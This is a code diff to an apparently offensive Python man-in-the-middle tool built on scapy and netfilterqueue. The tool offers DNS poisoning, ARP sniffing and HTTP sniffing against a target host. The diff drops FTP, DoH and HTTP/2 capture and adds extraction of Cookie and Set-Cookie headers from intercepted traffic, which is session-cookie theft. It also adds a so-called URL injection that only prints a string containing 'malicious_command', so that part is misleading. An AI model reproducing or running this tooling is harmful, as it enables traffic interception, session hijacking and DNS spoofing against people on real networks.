@@ -10,6 +10,8 @@ import os
 import platform
 import ctypes
 import subprocess
+from netfilterqueue import NetfilterQueue
+import re
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -68,39 +70,6 @@ class Device:
         time = strftime("%m/%d/%Y %H:%M:%S", localtime())
         print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')
 
-    def capture_doh(self):
-        sniff(iface=self.iface, prn=self.doh,
-              filter="tcp port 443", store=0)
-
-    def doh(self, pkt):
-        if pkt.haslayer('Raw'):
-            raw_data = pkt['Raw'].load.decode(errors='ignore')
-            if "dns-query" in raw_data:  # Detect DoH requests by identifying the 'dns-query' HTTP header
-                time = strftime("%m/%d/%Y %H:%M:%S", localtime())
-                print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}DNS over HTTPS Request{Style.RESET_ALL}]')
-
-    def capture_http2(self):
-        sniff(iface=self.iface, prn=self.http2,
-              filter="tcp port 443", store=0)
-
-    def http2(self, pkt):
-        if pkt.haslayer('Raw'):
-            raw_data = pkt['Raw'].load.decode(errors='ignore')
-            if "PRI * HTTP/2.0" in raw_data:  # Check for HTTP2 handshake (typically contains 'PRI * HTTP/2.0')
-                time = strftime("%m/%d/%Y %H:%M:%S", localtime())
-                print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}HTTP/2 Request{Style.RESET_ALL}]')
-
-    def capture_ftp(self):
-        sniff(iface=self.iface, prn=self.ftp,
-              filter="tcp port 21", store=0)
-
-    def ftp(self, pkt):
-        if pkt.haslayer('Raw'):
-            raw_data = pkt['Raw'].load.decode(errors='ignore')
-            if "USER" in raw_data or "PASS" in raw_data:  # Detect FTP commands like USER and PASS
-                time = strftime("%m/%d/%Y %H:%M:%S", localtime())
-                print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}FTP Command: {raw_data}{Style.RESET_ALL}]')
-
     def arp_sniff(self):
         def arp_pkt_callback(pkt):
             if pkt.haslayer(ARP) and pkt[ARP].op == 1:
@@ -112,13 +81,31 @@ class Device:
         def http_pkt_callback(pkt):
             if pkt.haslayer('Raw'):
                 raw_data = pkt['Raw'].load.decode(errors='ignore')
-                if "POST" in raw_data or "GET" in raw_data:
+
+                # Capture and print cookies
+                if "Cookie:" in raw_data:
+                    cookies = re.findall(r"Cookie: (.+?)\r\n", raw_data)
+                    if cookies:
+                        print(f"{Fore.GREEN}[Captured Cookie]: {cookies[0]}{Style.RESET_ALL}")
+
+                # Capture and print Set-Cookie headers
+                if "Set-Cookie:" in raw_data:
+                    cookies = re.findall(r"Set-Cookie: (.+?)\r\n", raw_data)
+                    if cookies:
+                        print(f"{Fore.RED}[Captured Set-Cookie]: {cookies[0]}{Style.RESET_ALL}")
+
+                # Inject command or data into HTTP GET/POST requests
+                if "GET" in raw_data or "POST" in raw_data:
                     if "Host:" in raw_data and "GET" in raw_data:
                         try:
                             host = raw_data.split("Host: ")[1].split("\r\n")[0]
                             path = raw_data.split("GET ")[1].split(" HTTP")[0]
                             url = f"http://{host}{path}"
                             print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
+                            
+                            # Inject a malicious parameter into the URL
+                            injected_url = f"{url}?cmd=malicious_command"
+                            print(f"{Fore.YELLOW}Injected URL: {injected_url}{Style.RESET_ALL}")
                         except Exception:
                             pass
 
@@ -143,9 +130,6 @@ class Device:
         print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')
 
     def dns_poison(self, spoof_ip):
-        # Import netfilterqueue only if DNS poisoning is selected
-        from netfilterqueue import NetfilterQueue
-        
         def dns_pkt_callback(pkt):
             if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                 spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
@@ -163,7 +147,7 @@ class Device:
     def sniff(self):
         while True:
             print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
-            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. Capture DoH\n6. Capture HTTP2\n7. Capture FTP\n8. Exit')
+            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. Exit')
             try:
                 choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
             except ValueError:
@@ -179,12 +163,6 @@ class Device:
             elif choice == 4:
                 self.arp_sniff()
             elif choice == 5:
-                self.capture_doh()
-            elif choice == 6:
-                self.capture_http2()
-            elif choice == 7:
-                self.capture_ftp()
-            elif choice == 8:
                 print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                 break
             else:
